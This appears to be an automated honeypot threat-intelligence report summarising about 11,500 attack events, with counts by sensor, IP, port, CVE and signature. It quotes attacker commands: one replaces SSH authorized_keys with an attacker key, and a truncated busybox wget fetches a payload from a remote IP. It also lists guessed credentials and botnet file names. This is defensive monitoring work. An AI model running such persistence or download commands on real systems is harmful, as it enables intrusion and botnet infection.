
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-30T19:01:48Z
**Timeframe:** 2025-09-30T18:20:01Z to 2025-09-30T19:01:01Z
**Log Files:** agg_log_20250930T182001Z.json, agg_log_20250930T184001Z.json, agg_log_20250930T190001Z.json

## Executive Summary

This report summarizes 11,564 malicious events recorded across the honeypot network. The majority of attacks were captured by the Cowrie, Suricata, and Honeytrap honeypots. A significant portion of the traffic originated from IP address `187.86.139.50`, primarily targeting SMB on port `TCP/445`, likely related to the DoublePulsar backdoor. Other notable activity includes SSH brute-force attempts and the execution of commands aimed at installing malware and securing unauthorized access.

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 3,929
- **Suricata:** 3,292
- **Honeytrap:** 2,478
- **Ciscoasa:** 1,457
- **Miniprint:** 128
- **Mailoney:** 87
- **Tanner:** 40
- **H0neytr4p:** 35
- **Dionaea:** 33
- **ConPot:** 28
- **Sentrypeer:** 17
- **Honeyaml:** 13
- **Adbhoney:** 12
- **Redishoneypot:** 9
- **ElasticPot:** 3
- **Ipphoney:** 3

### Top Attacking IPs
- **187.86.139.50:** 1,613
- **103.140.126.17:** 1,208
- **106.75.131.128:** 1,199
- **185.156.73.167:** 363
- **185.156.73.166:** 362
- **92.63.197.55:** 365
- **92.63.197.59:** 332
- **199.195.248.191:** 221
- **81.184.29.239:** 216
- **180.100.206.94:** 155
- **92.125.33.38:** 169
- **3.130.96.91:** 99
- **202.155.132.161:** 80
- **81.29.134.51:** 74
- **183.221.243.13:** 75

### Top Targeted Ports/Protocols
- **TCP/445:** 1,612
- **22:** 739
- **9100:** 128
- **25:** 87
- **443:** 53
- **8333:** 50
- **80:** 41
- **23:** 23
- **TCP/80:** 21
- **50000:** 25

### Most Common CVEs
- **CVE-2002-0013 CVE-2002-0012:** 8
- **CVE-2021-3449 CVE-2021-3449:** 5
- **CVE-2019-11500 CVE-2019-11500:** 4
- **CVE-2023-26801 CVE-2023-26801:** 1
- **CVE-2009-2765:** 1
- **CVE-2019-16920 CVE-2019-16920:** 1
- **CVE-2023-31983 CVE-2023-31983:** 1
- **CVE-2020-10987 CVE-2020-10987:** 1
- **CVE-2023-47565 CVE-2023-47565:** 1
- **CVE-2014-6271:** 1
- **CVE-2015-2051 CVE-2024-33112 CVE-2022-37056 CVE-2019-10891 CVE-2015-2051:** 1
- **CVE-2002-0013 CVE-2002-0012 CVE-1999-0517:** 1

### Commands Attempted by Attackers
- **`cd ~; chattr -ia .ssh; lockr -ia .ssh`:** 10
- **`lockr -ia .ssh`:** 10
- **`cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`:** 10
- **`uname -s -v -n -r -m`:** 7
- **`/ip cloud print`:** 4
- **`cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/[file]...`:** 3
- **`uname -a`:** 3
- **`ifconfig`:** 2
- **`cat /proc/cpuinfo`:** 2
- **`ps | grep '[Mm]iner'`:** 2
- **`ps -ef | grep '[Mm]iner'`:** 2
- **`ls -la ...`:** 2
- **`locate D877F783D5D3EF8Cs`:** 2
- **`echo Hi | cat -n`:** 2

### Signatures Triggered
- **ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication / 2024766:** 1,606
- **ET DROP Spamhaus DROP Listed Traffic Inbound group 25 / 2400024:** 341
- **ET DROP Dshield Block Listed Source group 1 / 2402000:** 349
- **ET SCAN NMAP -sS window 1024 / 2009582:** 213
- **ET INFO Reserved Internal IP Traffic / 2002752:** 57
- **ET SCAN MS Terminal Server Traffic on Non-standard Port / 2023753:** 38
- **ET CINS Active Threat Intelligence Poor Reputation IP group 46 / 2403345:** 37
- **ET CINS Active Threat Intelligence Poor Reputation IP group 43 / 2403342:** 34
- **ET CINS Active Threat Intelligence Poor Reputation IP group 48 / 2403347:** 21
- **ET CINS Active Threat Intelligence Poor Reputation IP group 41 / 2403340:** 22

### Users / Login Attempts
- **`345gs5662d34/345gs5662d34`:** 10
- **`root/3245gs5662d34`:** 4
- **`moth3r/fuck.3r`:** 2
- **`root/nPSpP4PBW0`:** 3
- **`oracle/oracle`:** 2
- **`root/www.qq.com`:** 2
- **`sbh/sbh123`:** 2
- **`jayesh/jayesh123`:** 2
- **`superadmin/admin123`:** 2
- **`superadmin/3245gs5662d34`:** 2

### Files Uploaded/Downloaded
- `arm.urbotnetisass`
- `arm5.urbotnetisass`
- `arm6.urbotnetisass`
- `arm7.urbotnetisass`
- `x86_32.urbotnetisass`
- `mips.urbotnetisass`
- `mipsel.urbotnetisass`
- `rondo.qre.sh`
- `rondo.sbx.sh`
- `server.cgi`

### HTTP User-Agents
- No HTTP user-agents were recorded in this period.

### SSH Clients and Servers
- No specific SSH client or server versions were recorded in this period.

### Top Attacker AS Organizations
- No attacker AS organizations were recorded in this period.

## Key Observations and Anomalies

- **High-Volume SMB Scans:** The overwhelming number of events are attributed to IP `187.86.139.50` scanning for SMB (TCP/445). The triggered Suricata signature `ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication` indicates this is likely automated scanning for systems vulnerable to exploits associated with the Shadow Brokers release.
- **Persistent SSH Intrusion Attempts:** A consistent pattern of SSH access attempts was observed. Attackers executed a series of commands to disable security (`chattr`), remove existing SSH keys, and install their own `authorized_key` to maintain persistent access.
- **Malware Deployment:** Attackers attempted to download and execute various ELF binaries (`*.urbotnetisass`) compiled for different architectures (ARM, x86, MIPS). This is a common tactic used by botnets to infect a wide range of IoT devices and servers.
- **Credential Stuffing:** A wide variety of username and password combinations were attempted, ranging from default credentials (e.g., `oracle/oracle`) to more complex, potentially previously breached passwords.
